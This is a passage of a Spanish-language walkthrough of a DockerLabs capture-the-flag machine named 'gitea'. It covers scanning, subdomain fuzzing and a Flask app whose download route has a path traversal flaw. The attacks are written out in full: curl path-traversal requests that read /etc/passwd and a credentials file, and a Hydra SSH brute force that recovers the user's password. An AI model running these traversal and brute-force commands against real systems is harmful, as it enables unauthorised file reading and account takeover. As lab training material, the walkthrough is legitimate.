---
icon: flag
---

# CTF Gitea Intermediate

URL Download CTF = [https://drive.google.com/file/d/1srO6rDx0jJJOQ0Bd5Vzub2WQsvyNOVTf/view?usp=sharing](https://drive.google.com/file/d/1srO6rDx0jJJOQ0Bd5Vzub2WQsvyNOVTf/view?usp=sharing)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip gitea.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_mount.sh gitea.tar
```

Info:

```
___________________¶¶
____________________¶¶__¶_5¶¶
____________5¶5__¶5__¶¶_5¶__¶¶¶5
__________5¶¶¶__¶¶5¶¶¶¶¶5¶¶__5¶¶¶5
_________¶¶¶¶__¶5¶¶¶¶¶¶¶¶¶¶¶__5¶¶¶¶5
_______5¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶_5¶¶__5¶¶¶¶¶5
______¶¶¶¶¶5_¶¶¶¶¶¶¶¶¶¶¶¶¶5¶¶¶__¶¶¶¶5¶5
_____¶¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶¶¶¶¶¶¶5
____¶¶¶¶¶¶¶_¶¶¶5¶¶¶¶5_¶¶¶¶¶5_5¶_¶¶¶¶¶¶¶¶5
___¶¶¶¶¶¶¶¶__5¶¶¶¶¶¶5___5¶¶¶¶__5¶¶¶¶¶¶¶¶¶5
__¶¶¶¶¶¶¶¶¶¶5__5¶¶¶¶¶¶5__5¶¶5_5¶¶¶¶¶¶¶¶¶¶¶
_5¶¶¶¶¶¶¶¶¶¶¶¶_5¶¶¶¶¶¶¶¶¶5__5¶¶¶¶¶¶¶¶¶¶¶¶¶5
_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_5¶¶¶¶
5¶¶¶¶¶¶¶¶¶¶¶¶5___5¶¶¶¶¶¶¶5__¶¶¶¶5_¶¶¶5_¶¶¶¶
¶¶¶¶¶¶¶¶_¶¶5_5¶5__¶¶¶¶¶¶¶¶¶5_5¶¶¶_5¶¶¶_5¶¶¶5
¶5¶¶¶¶¶5_¶¶_5¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶5_5¶¶_5¶¶¶_¶¶¶5
¶¶¶¶_¶¶__¶__¶¶¶¶¶¶5_5¶¶¶¶¶¶¶¶¶¶5_¶¶_5¶¶_5¶¶¶
¶¶¶5_5¶______5¶¶5¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶5_¶¶_5¶5_¶5¶
5¶¶____5¶¶¶¶5_____5¶¶¶¶¶¶¶5_¶¶¶¶¶5_¶__¶¶_5¶¶
_¶¶__5¶¶¶¶¶¶¶¶¶¶5____5¶¶¶¶¶¶_¶¶¶¶¶_____¶5_¶¶
_¶¶___5¶¶¶¶¶¶¶¶¶__________5¶5_¶¶¶¶¶____¶¶_¶¶
_¶¶_______5¶¶¶¶¶¶5____________¶¶¶¶¶_____¶_¶¶
_5¶5________5¶¶_¶¶¶¶5________5¶¶¶¶¶_______¶¶
__¶¶__________¶___¶¶¶¶¶5___5¶¶¶¶¶¶5_______¶5
__¶¶____________5¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶________¶
___¶________________5¶¶¶¶¶¶¶¶5_¶¶
___¶__________5¶¶¶¶¶¶¶¶5¶¶¶5__5¶5
_____________________5¶¶¶5____¶5

                                           
 ##   ##    ##       ####   ###  ##  #######  ######   ####       ##     ######    #####  
 ##   ##   ####     ##  ##   ##  ##   ##   #   ##  ##   ##       ####     ##  ##  ##   ## 
 ##   ##  ##  ##   ##        ## ##    ## #     ##  ##   ##      ##  ##    ##  ##  #       
 #######  ##  ##   ##        ####     ####     #####    ##      ##  ##    #####    #####  
 ##   ##  ######   ##        ## ##    ## #     ## ##    ##   #  ######    ##  ##       ## 
 ##   ##  ##  ##    ##  ##   ##  ##   ##   #   ##  ##   ##  ##  ##  ##    ##  ##  ##   ## 
 ##   ##  ##  ##     ####   ###  ##  #######  #### ##  #######  ##  ##   ######    #####  
                                         

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-27 06:41 EST
Nmap scan report for gitea.dl (172.17.0.2)
Host is up (0.000036s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e5:9a:b5:5e:a7:fc:3b:2f:7e:62:dd:51:61:f5:aa:2e (ECDSA)
|_  256 8e:ff:03:d7:9b:72:10:c9:72:03:4d:b8:bb:77:e9:b2 (ED25519)
80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: My Login Page
|_http-server-header: Apache/2.4.58 (Ubuntu)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=787dc55690b57cda; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=hvjs9pOKHXOUpV3ApSsretco6II6MTc0MDY1NjQ4Mjc0MTg0Mjc3MA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Thu, 27 Feb 2025 11:41:22 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" data-theme="gitea-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2FkbWluLnMzY3IzdGRpci5kZXYuZ2l0ZWEuZGwvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9hZG1pbi5zM2NyM3RkaXIuZGV2LmdpdGVhLmRsL2Fzc2V0cy9pbWcvbG9nby5wbm
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=af66185aa061f348; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=gvDCqQ13QtaKezc_OwgRRNCVXFs6MTc0MDY1NjQ4Nzc2NDk0NTg3OQ; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Thu, 27 Feb 2025 11:41:27 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.94SVN%I=7%D=2/27%Time=67C04F62%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(GetRequest,1000,"HTTP/1\.0\x20200\x20OK\r\nCache-Contr
SF:ol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nCo
SF:ntent-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_git
SF:ea=787dc55690b57cda;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Coo
SF:kie:\x20_csrf=hvjs9pOKHXOUpV3ApSsretco6II6MTc0MDY1NjQ4Mjc0MTg0Mjc3MA;\x
SF:20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Opt
SF:ions:\x20SAMEORIGIN\r\nDate:\x20Thu,\x2027\x20Feb\x202025\x2011:41:22\x
SF:20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20data-theme=
SF:\"gitea-auto\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"widt
SF:h=device-width,\x20initial-scale=1\">\n\t<title>Gitea:\x20Git\x20with\x
SF:20a\x20cup\x20of\x20tea</title>\n\t<link\x20rel=\"manifest\"\x20href=\"
SF:data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG
SF:9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic
SF:3RhcnRfdXJsIjoiaHR0cDovL2FkbWluLnMzY3IzdGRpci5kZXYuZ2l0ZWEuZGwvIiwiaWNv
SF:bnMiOlt7InNyYyI6Imh0dHA6Ly9hZG1pbi5zM2NyM3RkaXIuZGV2LmdpdGVhLmRsL2Fzc2V
SF:0cy9pbWcvbG9nby5wbm")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n
SF:Content-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r
SF:\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,197,"HTTP/1\.0\x20405\x20Me
SF:thod\x20Not\x20Allowed\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Cont
SF:rol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nS
SF:et-Cookie:\x20i_like_gitea=af66185aa061f348;\x20Path=/;\x20HttpOnly;\x2
SF:0SameSite=Lax\r\nSet-Cookie:\x20_csrf=gvDCqQ13QtaKezc_OwgRRNCVXFs6MTc0M
SF:DY1NjQ4Nzc2NDk0NTg3OQ;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20Sam
SF:eSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Thu,\x2027\x20F
SF:eb\x202025\x2011:41:27\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPR
SF:equest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
SF:quest");
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 88.33 seconds
```

Vemos que hay `3` puertos abiertos, si entramos en el puerto `80` de normal veremos una pagina normal y corriente, como vemos que la maquina se llama `gitea` y esta alojado en `Dockerlabs` podemos deducir un dominio llamado `gitea.dl`, vamos a probar si existe.

```shell
nano /etc/hosts

#Dentro del nano
<IP>           gitea.dl
```

Lo guardamos y probaremos a entrar desde el dominio, veremos como un login y en los campos vemos como unas credenciales por defecto, pero si las probamos no va a funcionar:

<figure><img src="../../.gitbook/assets/image (266).png" alt=""><figcaption></figcaption></figure>

Esas credenciales igualmente nos la apuntaremos:

```
User: admin
Pass: PassAdmin123-
```

Si realizamos un escaneo de `subdominios` para ver si encontramos algun `subdominio` veremos lo siguiente:

## FFUF

```shell
ffuf -c -w <WORDLIST> -u http://gitea.dl -H "Host: FUZZ.gitea.dl" -fs 13615
```

Info:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://gitea.dl
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Header           : Host: FUZZ.gitea.dl
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 13615
________________________________________________

dev                     [Status: 200, Size: 265382, Words: 106243, Lines: 5505, Duration: 9ms]
:: Progress: [20469/20469] :: Job [1/1] :: 3448 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```

Vemos que nos descubrio el `subdominio` `dev`, por lo que lo añadiremos al `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>           gitea.dl dev.gitea.dl
```

Lo guardamos y nos metemos dentro con dicho `subdominio` para ver que vemos.

```
URL = http://dev.gitea.dl
```

No veremos gran cosa, vamos a realizar un poco de `fuzzing`.

## Gobuster

```shell
gobuster dir -u http://dev.gitea.dl/ -w <WORDLIST> -x html,php,txt -t 100
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.gitea.dl/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/404.html             (Status: 200) [Size: 84362]
/LICENSE              (Status: 200) [Size: 1066]
/about.html           (Status: 200) [Size: 123571]
/assets               (Status: 301) [Size: 313] [--> http://dev.gitea.dl/assets/]
/contact.html         (Status: 200) [Size: 49689]
/index.html           (Status: 200) [Size: 265382]
/javascript           (Status: 301) [Size: 317] [--> http://dev.gitea.dl/javascript/]
/pricing.html         (Status: 200) [Size: 49178]
/search               (Status: 301) [Size: 313] [--> http://dev.gitea.dl/search/]
/server-status        (Status: 403) [Size: 277]
/signup.html          (Status: 200) [Size: 53916]
/signin.html          (Status: 200) [Size: 53297]
/src                  (Status: 301) [Size: 310] [--> http://dev.gitea.dl/src/]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Veremos varias cosas, pero entre ellas una interesante llamada `/search` que si entramos en el directorio, veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (267).png" alt=""><figcaption></figcaption></figure>

Vemos una especie de barra de busqueda con un ejemplo puesto en el mismo que pone `s3cr3tdir`, si lo probamos en la `URL` no veremos nada, pero si lo utilizamos como `subdominio` veremos que si funciona:

```shell
nano /etc/hosts

#Dentro del nano
<IP>           gitea.dl dev.gitea.dl s3cr3tdir.dev.gitea.dl
```

Lo guardamos y ahora nos metemos con dicho `subdominio` para ver que encontramos, pero no veremos nada interesante, aun haciendo `fuzzing` tampoco veremos nada, pero si realizar una busqueda de `subdominios` veremos lo siguiente:

```shell
ffuf -c -w <WORDLIST> -u http://s3cr3tdir.dev.gitea.dl -H "Host: FUZZ.s3cr3tdir.dev.gitea.dl" -fs 13615
```

Info:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://s3cr3tdir.dev.gitea.dl
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Header           : Host: FUZZ.s3cr3tdir.dev.gitea.dl
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 13615
________________________________________________

Admin                   [Status: 200, Size: 13931, Words: 1108, Lines: 249, Duration: 8ms]
ADMIN                   [Status: 200, Size: 13931, Words: 1108, Lines: 249, Duration: 8ms]
admin                   [Status: 200, Size: 13931, Words: 1108, Lines: 249, Duration: 8ms]
:: Progress: [20469/20469] :: Job [1/1] :: 2777 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```

Veremos que nos saca varios `subdominios` pero todos iguales, si probamos el de `admin` veremos que funciona:

```
nano /etc/hosts

#Dentro del nano
<IP>           gitea.dl dev.gitea.dl s3cr3tdir.dev.gitea.dl admin.s3cr3tdir.dev.gitea.dl
```

Lo guardamos y si entramos en dicho `subdominio` veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (268).png" alt=""><figcaption></figcaption></figure>

Vemos que hay un software llamado `gitea` que es parecido a `github`, vamos a logearnos en `gitea` y explorar los repositorios que puedan estar subidos.

Una vez que nos hayamos registrado, nos vamos a la opcion `Explore` -> `Repositories` y veremos esto:

<figure><img src="../../.gitbook/assets/image (269).png" alt=""><figcaption></figcaption></figure>

Vemos varios, si entramos al llamado `myapp` y entramos en el codigo de `app.py` veremos esto:

```python
from flask import Flask, request, render_template, send_file, redirect, url_for, flash
import os

app = Flask(__name__)
app.secret_key = "supersecretkey"

UPLOAD_FOLDER = "uploads"
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER


@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        if "file" not in request.files:
            flash("No se ha seleccionado ningún archivo", "danger")
            return redirect(request.url)

        file = request.files["file"]

        if file.filename == "":
            flash("No se ha seleccionado ningún archivo", "danger")
            return redirect(request.url)

        file_path = os.path.join(app.config["UPLOAD_FOLDER"], file.filename)
        file.save(file_path)
        flash(f'Archivo "{file.filename}" subido correctamente.', "success")

    files = os.listdir(UPLOAD_FOLDER)
    return render_template("index.html", files=files)


@app.route("/download", methods=["GET"])
def download():
    filename = request.args.get("filename")

    if not filename:
        flash("Se requiere un nombre de archivo", "danger")
        return redirect(url_for("index"))

    file_path = os.path.join(app.config["UPLOAD_FOLDER"], filename)

    if os.path.exists(file_path):
        return send_file(file_path, as_attachment=True)

    flash("Archivo no encontrado", "danger")
    return redirect(url_for("index"))


if __name__ == "__main__":
    app.run(debug=True)
```

Vemos que hay una vulnerabilidad en la siguiente linea:

```python
@app.route("/download", methods=["GET"])
```

Vemos que podremos realizar un `Path Traversal` en la aplicacion principal, que esta en el dominio `gitea.dl` por lo que vemos en el codigo, por lo que si hacemos lo siguiente:

```shell
curl "http://gitea.dl/download?filename=../../../../../etc/passwd"
```

Info:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
designer:x:1001:1001::/home/designer:/bin/bash
_galera:x:100:65534::/nonexistent:/usr/sbin/nologin
mysql:x:101:103:MariaDB Server,,,:/nonexistent:/bin/false
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
```

Veremos que nos muestra de forma correcta el `passwd` por lo que estamos aprovechando bien la vulnerabilidad.

Si seguimos investigando en los repositorios veremos el siguiente repositorio, llamado `giteaInfo` en el archivo `gitea_composed.xml`.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<gitea>
    <service>
        <name>gitea</name>
        <image>gitea/gitea:latest</image>
        <ports>
            <port>3000:3000</port>
            <port>222:22</port>
        </ports>
        <volumes>
            <volume>/home/designer/gitea:/data</volume>
            <volume>/home/designer/gitea:/data/info.txt</volume>
            <volume>/opt/"INFO_FILE"</volume>
        </volumes>
        <environment>
            <variable name="GITEA__database__DB_TYPE">sqlite3</variable>
            <variable name="GITEA__database__PATH">/data/gitea.db</variable>
        </environment>
        <restart>always</restart>
    </service>
</gitea>
```

Vemos que hay dos rutas que son las siguientes:

```xml
<volume>/home/designer/gitea:/data/info.txt</volume>
<volume>/opt/"INFO_FILE"</volume>
```

Por lo que vamos a probar a ver ese archivo:

```shell
curl "http://gitea.dl/download?filename=../../../../../home/designer/gitea/data/info.txt"
```

Pero no nos dejara, despues nos indica que hay un archivo de informacion en el `/opt` si probamos a ver el archivo de antes, pero en la ruta de `/opt` veremos esto:

```shell
curl "http://gitea.dl/download?filename=../../../../../opt/info.txt" > info.txt
```

Info:

```
user001:Passw0rd!23 - Juan abrió su laptop y suspiró. Hoy era el día en que finalmente accedería a la base de datos.
user002:Qwerty@567 - Marta había elegido su contraseña basándose en su teclado, una decisión que lamentaría más tarde.
user003:Secure#Pass1 - Cuando Miguel configuró su clave, pensó que era invulnerable. No sabía lo que le esperaba.
user004:H4ckM3Plz! - Los foros de hackers estaban llenos de desafíos, y Pedro decidió probar con una cuenta de prueba.
user005:Random*Key9 - Sofía tenía la costumbre de escribir sus contraseñas en post-its, hasta que un día desaparecieron.
user006:UltraSafe99$ - "Esta vez seré más cuidadoso", se prometió Andrés mientras ingresaba su nueva clave.
user007:TopSecret!! - Lucía nunca compartía su contraseña, ni siquiera con sus amigos más cercanos.
user008:MyP@ssw0rd22 - Julián pensó que usar números en lugar de letras lo haría más seguro. Se equivocó.
user009:S3cur3MePls# - La empresa exigía contraseñas seguras, pero Carlos siempre encontraba una forma de simplificarlas.
user010:Admin123! - Un ataque de fuerza bruta reveló que la cuenta del administrador tenía una clave predecible.
user011:RootMePls$5 - Daniel dejó su servidor expuesto y no tardó en notar actividad sospechosa.
user012:SuperSecure*78 - Alejandra se enorgullecía de su conocimiento en seguridad, pero un descuido le costó caro.
user013:HelloWorld#91 - A Roberto le gustaba la programación y decidió usar un clásico como su clave.
user014:LetMeInNow!! - Diego estaba cansado de recordar claves complejas y optó por algo simple.
user015:TrickyPass66 - Una red social filtró su contraseña y pronto la vio expuesta en la web.
user016:UnsafeButFun$$ - Joaquín se divertía rompiendo su propia seguridad, pero un día fue víctima de su propio juego.
user017:HackThis!@3 - Beatriz creó su contraseña en modo irónico, pero los atacantes no lo tomaron como broma.
user018:SuperSecurePassword123 - Los hackers más novatos pensaban que usar lenguaje leet era seguro. No lo era.
user019:JustAnotherKey99 - Nadie pensaría en usar una clave tan genérica... excepto miles de personas.
user020:TryGuessMe#22 - Un pentester descubrió la clave en segundos y le envió un mensaje a su dueño.
user021:SimplePass88! - Isabel nunca imaginó que alguien intentaría adivinar su contraseña.
user022:HiddenSecret!2 - Aún después de cambiar su clave, Luis no podía quitarse la sensación de inseguridad.
user023:CrazyCodePass@ - Un desarrollador decidió probar una contraseña al azar... y olvidarla al día siguiente.
user024:SneakyKey99$ - Los ataques de diccionario estaban de moda, y Pablo decidió cambiar su clave.
user025:Password@Vault - Un gestor de contraseñas podría haber ayudado a Ricardo, pero prefirió confiar en su memoria.
user026:EliteHacker#77 - Creer que una contraseña es segura solo por tener símbolos es un error común.
user027:FortKnoxPass!! - Ignacio aprendió por las malas que no existe una seguridad infalible.
user028:IronWall!99 - La clave era sólida, pero un descuido con su correo llevó a una filtración.
user029:UltraHidden#32 - A pesar del nombre, la contraseña de Javier no era tan oculta.
user030:GodModeActive! - Mariana sintió que tenía el control, hasta que recibió una alerta de acceso sospechoso.
user031:MasterKey$66 - Un viejo truco de seguridad le falló a Fernando en el peor momento.
user032:NoOneCanSeeMe! - La privacidad era esencial para Esteban, pero alguien siempre estaba mirando.
user033:LockedSafe#12 - Una contraseña compleja no sirve si la guardas en un documento sin cifrar.
user034:MyLittleSecret@ - El diario de Valeria contenía muchos secretos, incluida su clave más preciada.
user035:BigBossKey!! - Alfonso era el administrador del sistema, pero un error le costó el acceso.
user036:DigitalFortress$ - Inspirado en su novela favorita, Tomás creó una clave única... o eso creía.
user037:PasswordBank#9 - Usar la misma clave para todo fue la peor decisión de Gabriel.
user038:YouShallNotPass! - El homenaje a Gandalf no protegió a Enrique de un ataque automatizado.
user039:NotSoObvious99 - Era una contraseña "no tan obvia", hasta que apareció en una filtración.
user040:SecretStash@12 - Emilia guardaba sus contraseñas en un archivo llamado "Seguridad.txt". Mala idea.
user041:AnonymousPass$ - Creyó que su clave era anónima, pero los registros contaban otra historia.
user042:BlackHatKey!77 - Aprender hacking ético le ayudó a darse cuenta de sus propias vulnerabilidades.
user043:RedTeamAccess# - Un pentest interno reveló que la seguridad de la empresa era más frágil de lo que pensaban.
user044:PrivilegedUser@ - Tener privilegios de administrador no te hace inmune a ataques.
user045:HiddenVault$$ - Un sistema de almacenamiento cifrado no sirve si la clave es demasiado simple.
user046:EncryptionKing! - Amante del cifrado, Samuel pensó que su clave era invulnerable. No lo era.
user047:DecryptedEasy# - Un día descubrió que su clave había sido descifrada con facilidad.
user048:BypassMePlz!! - Quiso jugar con la seguridad y terminó perdiendo el acceso.
user049:SuperHiddenKey@ - Creyó que su contraseña nunca sería descubierta... hasta que lo fue.
user050:CyberGuardian99! - La ciberseguridad no es solo cuestión de contraseñas fuertes, sino de hábitos seguros.
```

Vemos bastantes usuarios con contraseñas, pero los usuarios no parecen reales, pero las contraseñas si, por lo que vamos a proba a realizar fuerza bruta con el usuario `designer` y el listado de contraseñas que hemos obtenido:

```shell
sed -E 's/^user[0-9]+:([^ ]+) -.*$/\1/' info.txt > pass.txt
```

> pass.txt

```
Passw0rd!23
Qwerty@567
Secure#Pass1
H4ckM3Plz!
Random*Key9
UltraSafe99$
TopSecret!!
MyP@ssw0rd22
S3cur3MePls#
Admin123!
RootMePls$5
SuperSecure*78
HelloWorld#91
LetMeInNow!!
TrickyPass66
UnsafeButFun$$
HackThis!@3
SuperSecurePassword123
JustAnotherKey99
TryGuessMe#22
SimplePass88!
HiddenSecret!2
CrazyCodePass@
SneakyKey99$
Password@Vault
EliteHacker#77
FortKnoxPass!!
IronWall!99
UltraHidden#32
GodModeActive!
MasterKey$66
NoOneCanSeeMe!
LockedSafe#12
MyLittleSecret@
BigBossKey!!
DigitalFortress$
PasswordBank#9
YouShallNotPass!
NotSoObvious99
SecretStash@12
AnonymousPass$
BlackHatKey!77
RedTeamAccess#
PrivilegedUser@
HiddenVault$$
EncryptionKing!
DecryptedEasy#
BypassMePlz!!
SuperHiddenKey@
CyberGuardian99!
```

## Escalate user designer

### Hydra

```shell
hydra -l designer -P pass.txt ssh://<IP> -t 64 -I
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-27 07:24:55
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 50 tasks per 1 server, overall 50 tasks, 50 login tries (l:1/p:50), ~1 try per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: designer   password: SuperSecurePassword123
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 21 final worker threads did not complete until end.
[ERROR] 21 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-27 07:25:00
```

Vemos que sacamos las credenciales del usuario `designer`, por lo que nos conectaremos mediante `SSH`.

### SSH

```shell
ssh designer@<IP>
```

Metemos como contraseña `SuperSecurePassword123` y veremos que estamos dentro, por lo que leeremos la flag de usuario.

> user.txt

```
4683f3b0c2f083bb9588370c0f8ab284
```

## Escalate Privileges

Si vemos los puertos que estan abiertos en la maquina, veremos lo siguiente:

```shell
ss -tuln
```

Info:

```
Netid          State           Recv-Q          Send-Q                     Local Address:Port                     Peer Address:Port          Process          
tcp            LISTEN          0               511                              0.0.0.0:80                            0.0.0.0:*                              
tcp            LISTEN          0               128                              0.0.0.0:22                            0.0.0.0:*                              
tcp            LISTEN          0               80                             127.0.0.1:3306                          0.0.0.0:*                              
tcp            LISTEN          0               128                                 [::]:22                               [::]:*                              
tcp            LISTEN          0               4096                                   *:3000
```

